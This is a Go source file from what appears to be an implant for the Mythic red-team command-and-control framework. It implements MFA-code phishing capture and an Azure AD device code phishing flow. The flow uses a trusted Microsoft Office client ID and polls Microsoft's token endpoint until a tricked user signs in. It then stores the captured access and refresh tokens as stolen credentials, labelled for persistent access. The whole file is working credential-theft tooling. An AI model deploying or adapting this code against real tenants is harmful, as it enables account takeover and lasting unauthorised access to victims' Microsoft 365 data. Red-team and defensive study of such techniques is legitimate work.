package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// credPromptExtractAction reads the "action" field from JSON params without
// requiring the full platform-specific args struct.
func credPromptExtractAction(params string) string {
	if params == "" {
		return ""
	}
	var a struct {
		Action string `json:"action"`
	}
	json.Unmarshal([]byte(params), &a)
	return strings.ToLower(a.Action)
}

// credPromptMFAArgs holds args for the device code flow action.
type credPromptMFAArgs struct {
	TenantID string `json:"tenant_id"` // Azure AD tenant (default: "organizations" for multi-tenant)
	ClientID string `json:"client_id"` // OAuth client ID (default: Microsoft Office)
	Resource string `json:"resource"`  // Target resource/scope (default: Microsoft Graph)
}

// Default OAuth client IDs — these are well-known Microsoft first-party app IDs
// that most tenants trust without admin consent.
const (
	// Microsoft Office — widely trusted, broad permissions
	defaultMFAClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	defaultMFATenantID = "organizations"
	defaultMFAScope    = "https://graph.microsoft.com/.default offline_access"
)

type deviceCodeResponse struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationURI string `json:"verification_uri"`
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
	Message         string `json:"message"`
}

type oauthTokenResponse struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	Error        string `json:"error"`
	ErrorDesc    string `json:"error_description"`
}

// credPromptMFAPhishResult formats the result from a captured MFA code.
func credPromptMFAPhishResult(code, title, username, platform string) structs.CommandResult {
	if code == "" {
		return successResult("User submitted empty code")
	}

	var sb strings.Builder
	sb.WriteString("=== MFA Phishing Result ===\n\n")
	sb.WriteString(fmt.Sprintf("User:     %s\n", username))
	sb.WriteString(fmt.Sprintf("Code:     %s\n", code))
	sb.WriteString(fmt.Sprintf("Dialog:   %s\n", title))
	sb.WriteString(fmt.Sprintf("Platform: %s\n", platform))

	creds := []structs.MythicCredential{
		{
			CredentialType: "plaintext",
			Realm:          "mfa-phish",
			Account:        username,
			Credential:     code,
			Comment:        fmt.Sprintf("credential-prompt mfa-phish capture (%s)", platform),
		},
	}

	return structs.CommandResult{
		Output:      sb.String(),
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
}

// credPromptDeviceCodeFlow initiates an Azure AD OAuth Device Code Flow.
// The user sees a code to enter at https://microsoft.com/devicelogin.
// This captures OAuth tokens (access + refresh) if the user authenticates,
// enabling persistent access without knowing the password.
func credPromptDeviceCodeFlow(task structs.Task) structs.CommandResult {
	var args credPromptMFAArgs
	if task.Params != "" {
		json.Unmarshal([]byte(task.Params), &args)
	}

	tenantID := args.TenantID
	if tenantID == "" {
		tenantID = defaultMFATenantID
	}
	clientID := args.ClientID
	if clientID == "" {
		clientID = defaultMFAClientID
	}
	scope := args.Resource
	if scope == "" {
		scope = defaultMFAScope
	}

	client := &http.Client{Timeout: 10 * time.Second}
	deviceCodeURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode", tenantID)

	// Step 1: Request device code
	form := url.Values{
		"client_id": {clientID},
		"scope":     {scope},
	}
	resp, err := client.PostForm(deviceCodeURL, form)
	if err != nil {
		return errorf("Device code request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return errorf("Failed to read device code response: %v", err)
	}

	var dcResp deviceCodeResponse
	if err := json.Unmarshal(body, &dcResp); err != nil {
		return errorf("Failed to parse device code response: %v\nBody: %s", err, string(body))
	}

	if dcResp.DeviceCode == "" {
		return errorf("No device code received. Tenant may not support device code flow.\nResponse: %s", string(body))
	}

	var sb strings.Builder
	sb.WriteString("=== OAuth Device Code Flow (MFA Fatigue) ===\n\n")
	sb.WriteString(fmt.Sprintf("User Code:   %s\n", dcResp.UserCode))
	sb.WriteString(fmt.Sprintf("URL:         %s\n", dcResp.VerificationURI))
	sb.WriteString(fmt.Sprintf("Message:     %s\n", dcResp.Message))
	sb.WriteString(fmt.Sprintf("Expires:     %d seconds\n", dcResp.ExpiresIn))
	sb.WriteString(fmt.Sprintf("Client ID:   %s\n", clientID))
	sb.WriteString(fmt.Sprintf("Tenant:      %s\n\n", tenantID))
	sb.WriteString("Polling for authentication...\n\n")

	// Step 2: Poll for token
	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenantID)
	interval := dcResp.Interval
	if interval < 5 {
		interval = 5
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(dcResp.ExpiresIn)*time.Second)
	defer cancel()

	for {
		select {
		case <-ctx.Done():
			sb.WriteString("[-] Device code expired — user did not authenticate\n")
			return successResult(sb.String())
		case <-time.After(time.Duration(interval) * time.Second):
		}

		tokenForm := url.Values{
			"client_id":   {clientID},
			"grant_type":  {"urn:ietf:params:oauth:grant-type:device_code"},
			"device_code": {dcResp.DeviceCode},
		}

		tokenResp, err := client.PostForm(tokenURL, tokenForm)
		if err != nil {
			continue
		}

		tokenBody, err := io.ReadAll(tokenResp.Body)
		tokenResp.Body.Close()
		if err != nil {
			continue
		}

		var token oauthTokenResponse
		if err := json.Unmarshal(tokenBody, &token); err != nil {
			continue
		}

		if token.Error == "authorization_pending" {
			continue // User hasn't authenticated yet
		}
		if token.Error == "slow_down" {
			interval += 5 // Back off
			continue
		}
		if token.Error != "" {
			sb.WriteString(fmt.Sprintf("[-] Token error: %s — %s\n", token.Error, token.ErrorDesc))
			return successResult(sb.String())
		}

		// Success — we got tokens
		sb.WriteString("[+] USER AUTHENTICATED — Tokens captured!\n\n")
		sb.WriteString(fmt.Sprintf("Token Type:    %s\n", token.TokenType))
		sb.WriteString(fmt.Sprintf("Scope:         %s\n", token.Scope))
		sb.WriteString(fmt.Sprintf("Expires In:    %d seconds\n\n", token.ExpiresIn))

		if token.AccessToken != "" {
			// Truncate access token for display (full token in credentials)
			display := token.AccessToken
			if len(display) > 80 {
				display = display[:80] + "..."
			}
			sb.WriteString(fmt.Sprintf("Access Token:  %s\n", display))
		}
		if token.RefreshToken != "" {
			display := token.RefreshToken
			if len(display) > 80 {
				display = display[:80] + "..."
			}
			sb.WriteString(fmt.Sprintf("Refresh Token: %s\n", display))
		}

		// Register tokens as credentials
		var creds []structs.MythicCredential
		if token.AccessToken != "" {
			creds = append(creds, structs.MythicCredential{
				CredentialType: "plaintext",
				Realm:          "azure-ad",
				Account:        "oauth-access-token",
				Credential:     token.AccessToken,
				Comment:        fmt.Sprintf("credential-prompt device-code (client: %s, tenant: %s)", clientID, tenantID),
			})
		}
		if token.RefreshToken != "" {
			creds = append(creds, structs.MythicCredential{
				CredentialType: "plaintext",
				Realm:          "azure-ad",
				Account:        "oauth-refresh-token",
				Credential:     token.RefreshToken,
				Comment:        fmt.Sprintf("credential-prompt device-code (client: %s, tenant: %s) — PERSISTENT", clientID, tenantID),
			})
		}

		result := structs.CommandResult{
			Output:    sb.String(),
			Status:    "success",
			Completed: true,
		}
		if len(creds) > 0 {
			result.Credentials = &creds
		}

		// Zero sensitive data
		structs.ZeroString(&token.AccessToken)
		structs.ZeroString(&token.RefreshToken)

		return result
	}
}
